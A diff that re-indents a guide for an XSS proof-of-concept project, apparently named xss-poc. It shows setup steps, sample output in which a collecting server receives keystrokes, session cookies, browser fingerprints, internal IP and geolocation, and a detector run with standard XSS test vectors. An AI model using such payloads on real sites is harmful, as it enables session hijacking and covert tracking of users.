@@ -1,10 +1,10 @@
 Proof of Concept (PoC) Guide
 Step 1: Setting Up the Environment
 
-    Clone the Repository:
+Clone the Repository:
 
-git clone <repository-url>
-cd xss-poc
+    git clone <repository-url>
+    cd xss-poc
 
 Install Dependencies:
 
@@ -21,9 +21,9 @@ Example:
 
 Step 2: Running the Server
 
-    Start the Server:
+Start the Server:
 
-node server.js
+    node server.js
 
 You should see a message indicating that the server is running:
 
@@ -60,42 +60,42 @@ Server Terminal Output
 
 When you interact with the form in xss_payload.html, you should see output in the server terminal similar to this:
 
-Captured Headers: {
-  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-  'content-type': 'application/json',
-  'accept': '*/*',
-  'origin': 'http://your-website.com:3000',
-  'referer': 'http://your-website.com:3000/xss_payload.html',
-  'accept-encoding': 'gzip, deflate',
-  'accept-language': 'en-US,en;q=0.9',
-  'connection': 'close'
-}
-POST Body: {
-  t: 'input',
-  v: 'testuser',
-  fp: {
+    Captured Headers: {
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+      'content-type': 'application/json',
+      'accept': '*/*',
+      'origin': 'http://your-website.com:3000',
+      'referer': 'http://your-website.com:3000/xss_payload.html',
+      'accept-encoding': 'gzip, deflate',
+      'accept-language': 'en-US,en;q=0.9',
+      'connection': 'close'
+    }
+    POST Body: {
+      t: 'input',
+      v: 'testuser',
+      fp: {
     ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
     lang: 'en-US',
     screen: '1920x1080',
     plugins: ['Chrome PDF Viewer', 'Shockwave Flash', ...],
     cookies: 'sessionid=abc123; csrftoken=xyz456'
-  },
-  ts: '2023-10-01T12:34:56.789Z',
-  canvasFingerprint: 'data:image/png;base64,...',
-  internalIP: '192.168.1.1',
-  location: { latitude: 40.7128, longitude: -74.0060 }
-}
+      },
+      ts: '2023-10-01T12:34:56.789Z',
+      canvasFingerprint: 'data:image/png;base64,...',
+      internalIP: '192.168.1.1',
+      location: { latitude: 40.7128, longitude: -74.0060 }
+    }
 
 XSS Detector Results
 
 When you test a URL with xss_detector.html, you should see results similar to this:
 
-Testing for XSS vulnerabilities...
-Potential XSS vulnerability found with vector: <script>alert("XSS")</script>
-No XSS vulnerability found with vector: <img src="x" onerror="alert('XSS')">
-Potential XSS vulnerability found with vector: <svg/onload=alert("XSS")>
-No XSS vulnerability found with vector: <body onload=alert("XSS")>
-...
+    Testing for XSS vulnerabilities...
+    Potential XSS vulnerability found with vector: <script>alert("XSS")</script>
+    No XSS vulnerability found with vector: <img src="x" onerror="alert('XSS')">
+    Potential XSS vulnerability found with vector: <svg/onload=alert("XSS")>
+    No XSS vulnerability found with vector: <body onload=alert("XSS")>
+    ...
 
 Conclusion
 
